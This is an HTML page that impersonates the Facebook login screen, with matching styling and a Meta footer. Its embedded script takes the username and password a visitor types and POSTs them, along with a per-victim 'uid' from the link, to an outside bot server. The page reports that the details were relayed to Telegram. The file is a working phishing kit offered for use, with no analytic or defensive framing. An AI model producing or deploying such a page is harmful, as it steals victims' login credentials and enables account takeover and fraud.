<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding-top: 60px;
    }

    .logo {
      color: #1877f2;
      font-size: 55px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .login-box {
      background-color: #fff;
      width: 90%;
      max-width: 380px;
      padding: 15px 15px 20px 15px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin: 6px 0;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 8px;
      background: #f5f6f7;
    }

    .login-box input:focus {
      outline: none;
      border-color: #1877f2;
      background: #fff;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-box button:hover {
      background-color: #166fe5;
    }

    .forgot {
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
      margin: 12px 0;
    }

    .divider {
      width: 100%;
      border-bottom: 1px solid #dadde1;
      margin: 10px 0 15px 0;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
      padding: 13px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 70%;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 12px;
      color: #606770;
      line-height: 1.5;
    }

    .footer a {
      color: #606770;
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="logo">facebook</div>

  <div class="login-box">
    <input type="text" id="username" placeholder="Mobile number or email address">
    <input type="password" id="password" placeholder="Password">
    <button onclick="sendLogin()">Log in</button>
    <a href="#" class="forgot">Forgotten password?</a>
    <div class="divider"></div>
    <button class="create-btn">Create new account</button>
  </div>

  <div class="footer">
    <p>
      English (UK) · বাংলা · हिन्दी · Español · العربية · Français (France)<br><br>
      Meta © 2025
    </p>
  </div>

  <script>
    const BACKEND_URL = "https://bot-production-85f6.up.railway.app";

    function getUID() {
      const params = new URLSearchParams(window.location.search);
      return params.get("uid");
    }

    async function sendLogin() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const uid = getUID();

      if (!uid) {
        alert("Invalid link: UID not found.");
        return;
      }
      if (!username || !password) {
        alert("Enter both username and password.");
        return;
      }

      try {
        const res = await fetch(`${BACKEND_URL}/receive_login`, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ uid, username, password })
        });
        const data = await res.json();
        if (data.status === "sent") {
          alert("✅ Login info sent to Telegram!");
        } else {
          alert("❌ Error: " + (data.error || "Unknown error"));
        }
      } catch (err) {
        alert("❌ Network error: " + err);
      }
    }
  </script>
</body>
</html>
